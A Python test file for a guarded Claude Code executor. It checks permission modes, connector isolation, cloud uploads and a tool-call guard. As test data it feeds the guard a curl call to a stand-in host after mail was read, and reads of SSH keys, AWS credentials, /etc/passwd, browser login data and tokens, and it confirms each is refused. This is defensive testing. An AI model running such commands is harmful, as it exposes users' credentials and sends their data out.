"""The executor: Claude Code in one folder, guarded, uploaded when in the cloud.

`ClaudeSDKClient` is replaced at the client boundary by a stand-in that
records the options it was built with, runs our PreToolUse hook against the
tool calls a test scripts, and yields messages built from the SDK's own
dataclasses. What is verified is our side -- the options we pass, the guard's
decisions, how a result becomes the spoken text -- not the SDK's process.
"""

from __future__ import annotations

import asyncio
import sys
from collections.abc import AsyncIterator
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import claude_agent_sdk
import pytest
from claude_agent_sdk import AssistantMessage, ResultMessage, TextBlock, ThinkingBlock, ToolUseBlock

from src.brain import audit, executor
from src.brain import config as brain_config
from src.brain.config import ExecutorConfig
from src.brain.executor import (
    FILES_BUCKET,
    THINK_SYSTEM,
    CloudWorkspace,
    check_tool_call,
    child_env,
    run_executor,
    upload_results,
)
from src.brain.team import TEAM

USER = "11111111-1111-4111-8111-111111111111"


@pytest.fixture(autouse=True)
def audit_places(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The guard keeps a record on the PC: not in the real one, from a test."""
    monkeypatch.setattr(audit, "AUDIT_DIR", tmp_path / "audit-logs")
    monkeypatch.setattr(audit, "BACKUP_DIR", tmp_path / "audit-backups")


class FakeSDKClient:
    """Stands in for `ClaudeSDKClient` as an async context manager."""

    messages: list[Any] = []
    tool_calls: list[dict[str, Any]] = []
    error: Exception | None = None
    last: FakeSDKClient | None = None

    def __init__(self, *, options: Any) -> None:
        self.options = options
        self.prompt = ""
        self.decisions: list[dict[str, Any]] = []
        FakeSDKClient.last = self

    async def __aenter__(self) -> FakeSDKClient:
        if FakeSDKClient.error is not None:
            raise FakeSDKClient.error
        return self

    async def __aexit__(self, *exc: object) -> bool:
        return False

    async def query(self, prompt: str) -> None:
        self.prompt = prompt
        guard = self.options.hooks["PreToolUse"][0].hooks[0]
        for call in FakeSDKClient.tool_calls:
            self.decisions.append(await guard(call, None, {"signal": None}))

    async def receive_response(self) -> AsyncIterator[Any]:
        for message in FakeSDKClient.messages:
            yield message


@pytest.fixture
def sdk(monkeypatch: pytest.MonkeyPatch) -> type[FakeSDKClient]:
    FakeSDKClient.messages = []
    FakeSDKClient.tool_calls = []
    FakeSDKClient.error = None
    FakeSDKClient.last = None
    monkeypatch.setattr(claude_agent_sdk, "ClaudeSDKClient", FakeSDKClient)
    return FakeSDKClient


@pytest.fixture
def jarvis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """A Jarvis folder under tmp_path, so the local run never touches the home."""
    root = tmp_path / "Documents" / "Jarvis"
    monkeypatch.setattr(brain_config, "EXECUTOR_ROOT", root)
    return root


def _result(text: str | None, cost: float | None = 0.12, error: bool = False) -> ResultMessage:
    return ResultMessage(
        subtype="success",
        duration_ms=1,
        duration_api_ms=1,
        is_error=error,
        num_turns=1,
        session_id="s",
        total_cost_usd=cost,
        result=text,
    )


def _assistant(*blocks: Any) -> AssistantMessage:
    return AssistantMessage(content=list(blocks), model="claude-sonnet-5-5")


# -- running locally ------------------------------------------------------------


async def test_a_local_run_works_in_the_jarvis_folder(sdk, jarvis: Path) -> None:
    sdk.messages = [
        _assistant(ThinkingBlock(thinking="...", signature="s"), TextBlock(text="Leyendo")),
        SimpleNamespace(kind="system"),
        _result("He creado informe.md"),
    ]
    result = await run_executor(
        "ak", "claude-sonnet-5-5", "haz un informe", ExecutorConfig(str(jarvis))
    )

    options = sdk.last.options
    assert await asyncio.to_thread(jarvis.is_dir)
    assert options.cwd == str(await asyncio.to_thread(jarvis.resolve))
    assert options.env["ANTHROPIC_API_KEY"] == "ak"
    assert options.setting_sources == []
    assert options.resume is None
    assert set(options.agents) == {"clerk", "researcher", "reasoner", "reviewer"}
    assert all(member.background is False for member in options.agents.values())
    assert options.permission_mode == "bypassPermissions"
    assert options.max_budget_usd == 2.0
    assert sdk.last.prompt == "haz un informe"
    assert result.ok and result.text == "He creado informe.md"
    assert result.cost_usd == pytest.approx(0.12)


@pytest.mark.parametrize(
    ("permissions", "mode", "disallowed"),
    [
        ("read_only", "dontAsk", ["Write", "Edit", "MultiEdit", "NotebookEdit", "Bash"]),
        ("edit_only", "acceptEdits", ["Bash"]),
    ],
)
async def test_permissions_narrow_what_the_executor_may_do(
    sdk, jarvis: Path, permissions: str, mode: str, disallowed: list[str]
) -> None:
    config = ExecutorConfig(str(jarvis), permissions=permissions)  # type: ignore[arg-type]
    await run_executor("ak", "m", "t", config)
    options = sdk.last.options
    assert options.permission_mode == mode
    assert options.disallowed_tools == disallowed
    if permissions == "read_only":
        assert "Write" not in options.allowed_tools


@pytest.mark.parametrize(
    ("permissions", "tools"), [("think", []), ("think_web", ["WebSearch", "WebFetch"])]
)
async def test_a_thought_has_no_hands_and_leaves_no_session(
    sdk, jarvis: Path, permissions: str, tools: list[str]
) -> None:
    config = ExecutorConfig(str(jarvis), permissions=permissions)  # type: ignore[arg-type]
    await run_executor("", "m", "t", config)
    options = sdk.last.options
    assert options.tools == tools and options.allowed_tools == tools
    assert options.permission_mode == "dontAsk"
    assert options.system_prompt == THINK_SYSTEM
    assert "no-session-persistence" in options.extra_args
    assert options.agents is None


@pytest.mark.parametrize("permissions", ["full_no_push", "edit_only", "read_only", "think"])
async def test_no_mode_reaches_the_accounts_connectors(sdk, jarvis: Path, permissions: str) -> None:
    config = ExecutorConfig(str(jarvis), permissions=permissions)  # type: ignore[arg-type]
    await run_executor("", "m", "t", config)
    options = sdk.last.options
    # Seen on 2026-11-02: on a login, Claude Code loaded the account's Docs and Supabase.
    assert options.mcp_servers == {} and "strict-mcp-config" in options.extra_args
    assert options.env["ENABLE_CLAUDEAI_MCP_SERVERS"] == "false"
    # And Claude Code's own tools (scheduling, remote triggers) do not exist for it.
    assert options.tools == options.allowed_tools
    assert not {"CronCreate", "RemoteTrigger", "Skill"} & set(options.tools)


async def test_the_guard_runs_on_every_tool_call(sdk, jarvis: Path) -> None:
    sdk.tool_calls = [
        {"tool_name": "Bash", "tool_input": {"command": "git push"}},
        {"tool_name": "Write", "tool_input": {"file_path": "ok.md"}},
        {"tool_name": "Read", "tool_input": "not a dict"},
    ]
    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))

    refused, allowed, odd = sdk.last.decisions
    assert refused["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Pushing" in refused["hookSpecificOutput"]["permissionDecisionReason"]
    assert allowed == {} and odd == {}


async def test_a_failed_result_is_not_ok(sdk, jarvis: Path) -> None:
    sdk.messages = [
        _assistant(TextBlock(text="  me quedé sin presupuesto ")),
        _result(None, None, True),
    ]
    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
    assert not result.ok
    assert result.text == "me quedé sin presupuesto"
    assert result.cost_usd == 0.0


async def test_silence_is_reported_as_such(sdk, jarvis: Path) -> None:
    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
    assert result.text == "El ejecutor terminó sin decir nada."


async def test_a_crash_is_a_sentence(sdk, jarvis: Path) -> None:
    sdk.error = RuntimeError("cli missing")
    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
    assert not result.ok
    assert "cli missing" in result.text


async def test_without_the_sdk_the_executor_says_so(jarvis: Path, monkeypatch) -> None:
    monkeypatch.setitem(sys.modules, "claude_agent_sdk", None)
    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
    assert not result.ok
    assert "claude-agent-sdk" in result.text


# -- running in the cloud ---------------------------------------------------------


class FakeStore:
    """Our Supabase port's `upload`, recording what was stored."""

    def __init__(self, accept: bool = True) -> None:
        self.accept = accept
        self.uploads: list[tuple[str, str, bytes, str]] = []

    async def upload(self, bucket: str, path: str, data: bytes, *, content_type: str) -> bool:
        self.uploads.append((bucket, path, data, content_type))
        return self.accept


async def test_a_cloud_run_uploads_what_it_left_and_cleans_up(sdk, monkeypatch) -> None:
    seen: list[Path] = []

    async def write_then_answer(prompt: str) -> None:
        root = Path(sdk.last.options.cwd)
        seen.append(root)
        (root / "informe.md").write_text("# hola", encoding="utf-8")

    monkeypatch.setattr(FakeSDKClient, "query", lambda self, p: write_then_answer(p))
    sdk.messages = [_result("Hecho.")]
    store = FakeStore()
    workspace = CloudWorkspace(store=store, user_id=USER, kwami_id="")  # type: ignore[arg-type]

    result = await run_executor("ak", "m", "t", ExecutorConfig(), cloud=workspace)

    assert not seen[0].exists()
    bucket, path, data, content_type = store.uploads[0]
    assert bucket == FILES_BUCKET and data == b"# hola"
    assert path.startswith(f"{USER}/default/") and path.endswith("/informe.md")
    assert result.uploaded == 1
    assert result.uploaded_to.startswith(f"{FILES_BUCKET}/{USER}/default/")
    assert result.text.startswith("Hecho.\n\nDetalle: 1 archivo(s)")


async def test_a_cloud_run_with_nothing_stored_says_nothing_about_files(sdk) -> None:
    sdk.messages = [_result("Hecho.")]
    result = await run_executor("ak", "m", "t", ExecutorConfig(), cloud=CloudWorkspace(store=None))
    assert result.text == "Hecho." and result.uploaded == 0


async def test_uploads_skip_junk_secrets_big_files_and_failures(
    tmp_path: Path, monkeypatch
) -> None:
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "x.js").write_text("x")
    (tmp_path / ".env.local").write_text("SECRET=1")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "a.txt").write_text("a")
    (tmp_path / "big.bin").write_bytes(b"0" * 64)
    (tmp_path / "b.unknownext").write_text("b")
    (tmp_path / "c.txt").write_text("c")
    monkeypatch.setattr(executor, "MAX_UPLOAD_BYTES", 32)
    monkeypatch.setattr(executor, "MAX_UPLOAD_FILES", 2)

    store = FakeStore()
    workspace = CloudWorkspace(store=store, user_id=USER, kwami_id="k")  # type: ignore[arg-type]
    prefix, stored = await upload_results(tmp_path, workspace, "t1")

    assert prefix == f"{USER}/k/t1"
    assert stored == 2
    # Sorted walk: b.unknownext, big.bin (too big), c.txt, then the cap.
    assert [u[1] for u in store.uploads] == [f"{prefix}/b.unknownext", f"{prefix}/c.txt"]
    assert store.uploads[0][3] == "application/octet-stream"


async def test_an_unreadable_or_refused_file_is_left_out(tmp_path: Path, monkeypatch) -> None:
    (tmp_path / "ok.txt").write_text("ok")
    monkeypatch.setattr(
        executor, "_files_to_upload", lambda root: [root / "vanished.txt", root / "ok.txt"]
    )
    store = FakeStore(accept=False)
    workspace = CloudWorkspace(store=store, user_id=USER)  # type: ignore[arg-type]
    assert await upload_results(tmp_path, workspace, "t") == (f"{USER}/default/t", 0)
    assert len(store.uploads) == 1


# -- the guard ------------------------------------------------------------------------


def test_a_path_that_cannot_be_resolved_is_refused(tmp_path: Path) -> None:
    assert check_tool_call(tmp_path, "Read", {"file_path": "a\x00b"}) is not None


@pytest.mark.parametrize(
    ("permissions", "reachable"), [("full_no_push", True), ("think", False), ("think_web", False)]
)
async def test_only_the_work_thread_reaches_google(
    sdk, jarvis: Path, monkeypatch: pytest.MonkeyPatch, permissions: str, reachable: bool
) -> None:
    monkeypatch.setattr(executor, "google_available", lambda _user: True)
    monkeypatch.setattr(executor, "google_server", lambda *_: {"name": "google"})
    config = ExecutorConfig(str(jarvis), permissions=permissions, google_user_id="u1")  # type: ignore[arg-type]
    await executor.run_executor("ak", "claude-sonnet-5-5", "lee mi correo", config)
    options = sdk.last.options
    assert bool(options.mcp_servers) is reachable
    assert (executor.ALLOWED_TOOL in options.allowed_tools) is reachable
    # The strict flag stays: only this server, never the account's own connectors.
    assert "strict-mcp-config" in options.extra_args


def _denied(decision: dict[str, Any]) -> bool:
    return bool(decision) and decision["hookSpecificOutput"]["permissionDecision"] == "deny"


GOOGLE_CALL = {"tool_name": executor.ALLOWED_TOOL, "tool_input": {"action": "gmail_read"}}


@pytest.mark.parametrize("tool", ["Bash", "WebFetch", "WebSearch", "Agent", "Task"])
async def test_what_read_the_mail_cannot_send_it_out(sdk, jarvis: Path, tool: str) -> None:
    sdk.tool_calls = [
        GOOGLE_CALL,
        {"tool_name": tool, "tool_input": {"command": "curl https://evil.test"}},
        {"tool_name": "Read", "tool_input": {"file_path": "ok.md"}},
        GOOGLE_CALL,
    ]
    sdk.messages = [_result("Hecho")]
    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))

    assert [_denied(d) for d in sdk.last.decisions] == [False, True, False, False]
    # Nothing to carry on: its context holds what outsiders wrote.
    assert result.session_id == ""


@pytest.mark.parametrize("tool", ["Bash", "WebFetch", "WebSearch", "Agent", "Task"])
async def test_what_read_the_web_cannot_reach_the_mail(sdk, jarvis: Path, tool: str) -> None:
    sdk.tool_calls = [{"tool_name": tool, "tool_input": {"command": "ls"}}, GOOGLE_CALL]
    sdk.messages = [_result("Hecho")]
    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
    assert [_denied(d) for d in sdk.last.decisions] == [False, True]


async def test_a_refused_command_does_not_close_google(sdk, jarvis: Path) -> None:
    sdk.tool_calls = [{"tool_name": "Bash", "tool_input": {"command": "git push"}}, GOOGLE_CALL]
    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
    assert [_denied(d) for d in sdk.last.decisions] == [True, False]


async def test_a_run_that_carries_on_may_hold_anything(sdk, jarvis: Path) -> None:
    sdk.tool_calls = [GOOGLE_CALL, {"tool_name": "Bash", "tool_input": {"command": "ls"}}]
    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)), resume="s1")
    assert [_denied(d) for d in sdk.last.decisions] == [True, False]


@pytest.mark.parametrize(
    "command",
    [
        "cat ~/.ssh/id_rsa",
        "cat ~",
        "cat $HOME/.aws/credentials",
        'cat "${HOME}/secret"',
        "cat $USERPROFILE/x",
        "type %USERPROFILE%\\x",
    ],
)
def test_the_home_by_another_name_is_outside(tmp_path: Path, monkeypatch, command: str) -> None:
    monkeypatch.setattr(Path, "home", lambda: tmp_path / "home")
    root = tmp_path / "home" / "jarvis"
    root.mkdir(parents=True)
    assert "outside" in (check_tool_call(root, "Bash", {"command": command}) or "")


@pytest.mark.parametrize("tool", ["Grep", "Glob"])
def test_a_search_cannot_walk_into_what_stays_shut(tmp_path: Path, monkeypatch, tool: str) -> None:
    root = tmp_path / "jarvis"
    root.mkdir()
    profile = tmp_path / "profile"
    (profile / "projects").mkdir(parents=True)
    (profile / "AppData" / "Chrome").mkdir(parents=True)
    (profile / "AppData" / "Chrome" / "Login Data").write_text("secret")
    monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(profile))

    call = {"pattern": "x"}
    assert "narrower" in (check_tool_call(root, tool, {**call, "path": str(profile)}) or "")
    assert check_tool_call(root, tool, {**call, "path": str(profile / "projects")}) is None


def test_a_search_of_a_huge_folder_is_told_to_narrow(tmp_path: Path, monkeypatch) -> None:
    root = tmp_path / "jarvis"
    root.mkdir()
    opened = tmp_path / "opened"
    (opened / "a" / "b").mkdir(parents=True)
    monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(opened))
    monkeypatch.setattr(executor, "_SEARCH_WALK_LIMIT", 1)

    assert "narrower" in (
        check_tool_call(root, "Grep", {"pattern": "x", "path": str(opened)}) or ""
    )


def test_inside_the_jarvis_folder_a_search_goes_anywhere(tmp_path: Path) -> None:
    (tmp_path / ".claude").mkdir()
    assert check_tool_call(tmp_path, "Grep", {"pattern": "x"}) is None
    assert check_tool_call(tmp_path, "Glob", {"pattern": "**/*.py", "path": "."}) is None


@pytest.mark.parametrize(
    "pattern", ["/etc/*", "C:/Users/me/**", "~/.ssh/*", "$HOME/*", "%USERPROFILE%/*", "../**/*"]
)
def test_a_glob_pattern_cannot_name_another_place(tmp_path: Path, pattern: str) -> None:
    assert "narrow" not in (check_tool_call(tmp_path, "Glob", {"pattern": pattern}) or "")
    assert "Search inside" in (check_tool_call(tmp_path, "Glob", {"pattern": pattern}) or "")


@pytest.mark.parametrize(
    "command",
    ["cat ~/jarvis/notes.md", "git diff HEAD~1", "echo $HOMEBREW_PREFIX", "ls backup~"],
)
def test_the_home_check_lets_the_rest_through(tmp_path: Path, monkeypatch, command: str) -> None:
    monkeypatch.setattr(Path, "home", lambda: tmp_path / "home")
    root = tmp_path / "home" / "jarvis"
    root.mkdir(parents=True)
    assert check_tool_call(root, "Bash", {"command": command}) is None


@pytest.mark.skipif(sys.platform != "win32", reason="a drive path is inside only on Windows")
def test_a_windows_host_lets_a_command_name_files_inside_the_folder(tmp_path: Path) -> None:
    """Absolute paths inside the folder do not stop the scan of a command.

    Windows-only: on Linux every drive path is refused (see
    `test_a_linux_host_refuses_windows_paths`). The scan itself is pinned on
    any host by `test_the_command_scan_reads_paths_the_host_way`.
    """
    root = (tmp_path / "j" / "w").resolve()
    root.mkdir(parents=True)
    command = f"type {root}/notas.txt && cat /{root.drive[0].lower()}/{root.as_posix()[3:]}/a"
    assert len(executor._command_paths(command, windows=True)) == 2
    assert check_tool_call(root, "Bash", {"command": command}) is None


@pytest.mark.parametrize(
    ("command", "windows", "paths"),
    [
        # Windows: drive, Git Bash and UNC paths; Git Bash reads as its drive.
        (r"type C:\x\y.txt", True, [(r"C:\x\y.txt", r"C:\x\y.txt")]),
        ("ls /c/Users/u", True, [("/c/Users/u", "C:/Users/u")]),
        (r'dir "\\server\share"', True, [(r"\\server\share", r"\\server\share")]),
        # A one-letter segment mid-path is no Git Bash path of its own.
        ("cat src/a/b.py", True, []),
        # Linux: the whole POSIX path, never a piece of it, never a drive.
        ("cat /home/u/a/b.txt", False, [("/home/u/a/b.txt", "/home/u/a/b.txt")]),
        ("ls /c/Users/u", False, [("/c/Users/u", "/c/Users/u")]),
        ("cat src/a/b.py", False, []),
        (r"cat C:\x", False, [(r"C:\x", r"C:\x")]),
        ("make > /dev/null 2>/dev/null", False, []),
    ],
)
def test_the_command_scan_reads_paths_the_host_way(
    command: str, windows: bool, paths: list[tuple[str, str]]
) -> None:
    assert executor._command_paths(command, windows=windows) == paths


def _drive_less(path: Path) -> str:
    """`path` as a POSIX absolute path: itself on Linux, without its drive on
    Windows, where Path joins it back onto the folder's drive."""
    return "/" + "/".join(path.parts[1:])


def test_a_linux_host_lets_a_command_name_files_inside_the_folder(
    tmp_path: Path, monkeypatch
) -> None:
    """The cloud executor once read "/a/b.txt" out of "<folder>/a/b.txt" as
    Git Bash's A:/b.txt and refused a path inside its own folder."""
    monkeypatch.setattr(executor, "os", SimpleNamespace(name="posix"))
    root = (tmp_path / "u").resolve()
    root.mkdir()
    command = f"cat {_drive_less(root)}/a/b.txt 2> /dev/null"
    assert check_tool_call(root, "Bash", {"command": command}) is None


@pytest.mark.parametrize("command", ["cat /etc/passwd", "ls /c/Users/Usuario"])
def test_a_linux_host_refuses_posix_paths_outside(tmp_path: Path, monkeypatch, command) -> None:
    monkeypatch.setattr(executor, "os", SimpleNamespace(name="posix"))
    path = command.split()[1]
    assert check_tool_call(tmp_path, "Bash", {"command": command}) == (
        f"{path} is outside the Jarvis folder."
    )


@pytest.mark.parametrize("raw", [r"C:\Users\Usuario\notas.txt", r"\\server\share\x"])
def test_a_linux_host_refuses_windows_paths(tmp_path: Path, monkeypatch, raw: str) -> None:
    """The cloud executor runs on Linux, where Path() would read these as
    relative names under the folder. Pinned on any host by setting it to POSIX."""
    monkeypatch.setattr(executor, "os", SimpleNamespace(name="posix"))
    refusal = check_tool_call(tmp_path, "Read", {"file_path": raw})
    assert refusal == f"{raw} is outside the Jarvis folder."


# -- the thread: memory, team, a clean environment -------------------------------


async def test_a_run_can_carry_on_an_earlier_one(sdk, jarvis: Path) -> None:
    sdk.messages = [_result("Seguido")]
    result = await run_executor(
        "ak",
        "claude-sonnet-5-5",
        "sigue",
        ExecutorConfig(str(jarvis)),
        resume="earlier",
        effort="high",
    )
    assert sdk.last.options.resume == "earlier"
    assert sdk.last.options.effort == "high"
    assert result.session_id == "s"


async def test_a_failure_keeps_the_session_it_was_resuming(sdk, jarvis: Path) -> None:
    sdk.error = RuntimeError("boom")
    result = await run_executor(
        "ak", "claude-sonnet-5-5", "sigue", ExecutorConfig(str(jarvis)), resume="earlier"
    )
    assert not result.ok and result.session_id == "earlier"


async def test_tool_calls_are_reported_as_progress(sdk, jarvis: Path) -> None:
    sdk.messages = [
        _assistant(
            ToolUseBlock(id="1", name="Bash", input={"command": "ls"}),
            ToolUseBlock(
                id="2",
                name="Agent",
                input={"subagent_type": "reviewer", "description": "Comprueba el informe"},
            ),
        ),
        _result("Hecho"),
    ]
    seen: list[str] = []
    await run_executor(
        "ak", "claude-sonnet-5-5", "t", ExecutorConfig(str(jarvis)), on_progress=seen.append
    )
    assert seen == ["Bash", "reviewer: Comprueba el informe"]


@pytest.mark.parametrize("permissions", ["read_only", "edit_only"])
async def test_a_narrow_mode_gets_no_team(sdk, jarvis: Path, permissions: str) -> None:
    sdk.messages = [_result("Hecho")]
    await run_executor(
        "ak", "claude-sonnet-5-5", "t", ExecutorConfig(str(jarvis), permissions=permissions)
    )
    assert sdk.last.options.agents is None


def test_the_team_keeps_opus_for_hard_thinking() -> None:
    assert TEAM["reasoner"].model == "claude-opus-5-5"
    assert TEAM["clerk"].model == "claude-haiku-5-5"
    assert {"Write", "Edit", "Bash"}.isdisjoint(TEAM["reasoner"].tools)
    assert {"Write", "Edit"}.isdisjoint(TEAM["reviewer"].tools)


def test_the_executor_inherits_no_secrets(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SUPABASE_SECRET_KEY", "x")
    monkeypatch.setenv("TWILIO_AUTH_TOKEN", "x")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "x")
    monkeypatch.setenv("SUPABASE_URL", "kept")

    env = child_env("ak")

    assert env["SUPABASE_SECRET_KEY"] == ""
    assert env["TWILIO_AUTH_TOKEN"] == ""
    assert env["ANTHROPIC_AUTH_TOKEN"] == ""
    assert env["ANTHROPIC_API_KEY"] == "ak"
    assert env["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] == "1"
    assert "SUPABASE_URL" not in env


class TestOpenedFolders:
    def test_outside_the_jarvis_folder_is_shut_by_default(self, tmp_path, monkeypatch):
        monkeypatch.delenv("KWAMI_EXECUTOR_FOLDERS", raising=False)
        other = tmp_path / "other"
        root = tmp_path / "root"
        assert "outside" in str(check_tool_call(root, "Read", {"file_path": str(other / "a")}))

    def test_a_folder_the_user_opened_can_be_used(self, tmp_path, monkeypatch):
        other = tmp_path / "other"
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", f" {other} ; {tmp_path / 'more'}")
        root = tmp_path / "root"
        assert check_tool_call(root, "Read", {"file_path": str(other / "a.py")}) is None
        assert check_tool_call(root, "Read", {"file_path": str(tmp_path / "more")}) is None
        assert "outside" in str(check_tool_call(root, "Read", {"file_path": str(tmp_path / "x")}))

    @pytest.mark.parametrize(
        "secret",
        [".ssh/id_rsa", ".aws/credentials", ".claude/.credentials.json", "Chrome/Login Data"],
    )
    def test_keys_stay_shut_even_inside_an_opened_folder(self, tmp_path, monkeypatch, secret):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        refusal = check_tool_call(tmp_path / "root", "Read", {"file_path": str(tmp_path / secret)})
        assert "outside" in str(refusal)

    @pytest.mark.parametrize(
        "secret",
        [
            ".jarvis/brain-worker.env",
            ".jarvis/browser-profiles/a/Preferences",
            ".claude.json",
            ".git-credentials",
            ".npmrc",
            "AppData/Roaming/Slack/token",
            "AppData/Local/Google/Chrome/User Data/Local State",
            "keys/brain-worker.env",
        ],
    )
    def test_the_whole_profile_open_leaves_these_shut(self, tmp_path, monkeypatch, secret):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        refusal = check_tool_call(tmp_path / "root", "Read", {"file_path": str(tmp_path / secret)})
        assert "outside" in str(refusal)

    def test_the_system_temporary_folder_stays_usable(self, tmp_path, monkeypatch):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        temp = tmp_path / "AppData" / "Local" / "Temp" / "build.log"
        assert check_tool_call(tmp_path / "root", "Read", {"file_path": str(temp)}) is None

    def test_a_project_in_the_open_profile_can_be_used(self, tmp_path, monkeypatch):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        path = tmp_path / "Documents" / "Web" / "index.html"
        assert check_tool_call(tmp_path / "root", "Write", {"file_path": str(path)}) is None

    def test_the_code_of_the_guard_stays_shut(self, tmp_path, monkeypatch):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", executor._OWN_CODE.parent.as_posix())
        for own in (Path(executor.__file__), executor._OWN_CODE / "agent" / ".data" / "mirrors"):
            refusal = check_tool_call(tmp_path / "root", "Edit", {"file_path": str(own)})
            assert "outside" in str(refusal)

    def test_a_folder_the_user_shut_stays_shut_inside_an_opened_one(self, tmp_path, monkeypatch):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        monkeypatch.setenv("KWAMI_EXECUTOR_SHUT", str(tmp_path / "Kwami"))
        root = tmp_path / "root"
        shut = {"file_path": str(tmp_path / "Kwami" / "a.py")}
        assert "outside" in str(check_tool_call(root, "Read", shut))
        assert check_tool_call(root, "Read", {"file_path": str(tmp_path / "Web" / "a.py")}) is None

    @pytest.mark.parametrize(
        "command",
        [
            "cd ~ && cat .jarvis/brain-worker.env",
            "cat keys/brain-worker.env",
            "type AppData\\Roaming\\Slack\\token",
            "cp .ssh/id_rsa here",
        ],
    )
    def test_a_relative_path_does_not_get_a_command_to_them(self, tmp_path, monkeypatch, command):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(Path.home()))
        assert "shut" in str(check_tool_call(tmp_path, "Bash", {"command": command}))

    @pytest.mark.parametrize("command", ["npm run dev", "python build.py", "ls .github/workflows"])
    def test_an_ordinary_command_passes(self, tmp_path, command):
        assert check_tool_call(tmp_path, "Bash", {"command": command}) is None

    def test_env_files_stay_shut_in_an_opened_folder(self, tmp_path, monkeypatch):
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        refusal = check_tool_call(
            tmp_path / "root", "Read", {"file_path": str(tmp_path / "app" / ".env")}
        )
        assert ".env" in str(refusal)

    def test_the_model_is_told_which_folders_are_open(self, tmp_path, monkeypatch):
        monkeypatch.delenv("KWAMI_EXECUTOR_FOLDERS", raising=False)
        assert "opened these folders" not in executor._system_append()
        monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path))
        assert str(tmp_path.resolve()) in executor._system_append()


async def test_the_work_thread_has_chrome_on_the_pc_and_gives_it_back(
    sdk, jarvis: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    closed: list[bool] = []

    class FakeTools:
        def __init__(self, user_id: str) -> None:
            assert user_id == "u1"

        async def close(self) -> None:
            closed.append(True)

    monkeypatch.setattr(executor, "browser_available", lambda _user: True)
    monkeypatch.setattr(executor, "BrowserTools", FakeTools)
    monkeypatch.setattr(executor, "browser_server", lambda *_: {"name": "browser"})
    config = ExecutorConfig(str(jarvis), browser_user_id="u1")
    await executor.run_executor("ak", "claude-sonnet-5-5", "busca", config)
    options = sdk.last.options
    assert "browser" in options.mcp_servers
    assert set(executor.BROWSER_TOOLS) <= set(options.allowed_tools)
    assert "real Chrome" in options.system_prompt["append"]
    assert closed == [True]


async def test_a_task_that_used_the_browser_leaves_no_session(sdk, jarvis: Path) -> None:
    sdk.tool_calls = [{"tool_name": "mcp__browser__open", "tool_input": {}}]
    sdk.messages = [_result("Hecho")]
    result = await run_executor("ak", "claude-sonnet-5-5", "busca", ExecutorConfig(str(jarvis)))
    assert result.session_id == ""


async def test_the_pc_keeps_a_record_and_a_copy(
    sdk, jarvis: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("KWAMI_EXECUTOR_FOLDERS", str(tmp_path / "web"))
    page = tmp_path / "web" / "index.html"
    page.parent.mkdir()
    page.write_text("antes")
    sdk.tool_calls = [{"tool_name": "Edit", "tool_input": {"file_path": str(page)}}]
    sdk.messages = [_result("Hecho")]
    await run_executor("ak", "claude-sonnet-5-5", "edita", ExecutorConfig(str(jarvis)))
    assert next((tmp_path / "audit-logs").glob("*.jsonl")).read_text(encoding="utf-8")
    assert [p.read_text() for p in (tmp_path / "audit-backups").rglob("index.html")] == ["antes"]


async def test_in_the_cloud_nothing_is_kept_on_disk(
    sdk, jarvis: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(executor, "executor_in_cloud", lambda: True)
    sdk.tool_calls = [{"tool_name": "Bash", "tool_input": {"command": "ls"}}]
    sdk.messages = [_result("Hecho")]
    await run_executor("ak", "claude-sonnet-5-5", "lista", ExecutorConfig(str(jarvis)))
    assert not (tmp_path / "audit-logs").exists()


async def test_a_task_on_the_pc_gets_the_database_when_switched_on(
    sdk, jarvis: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(executor, "supabase_available", lambda _user: True)
    monkeypatch.setattr(executor, "supabase_server", lambda *_: {"name": "kwami_db"})
    config = ExecutorConfig(str(jarvis), google_user_id="u1")
    await executor.run_executor("ak", "claude-sonnet-5-5", "mira", config)
    options = sdk.last.options
    assert "kwami_db" in options.mcp_servers
    assert executor.SUPABASE_TOOL in options.allowed_tools
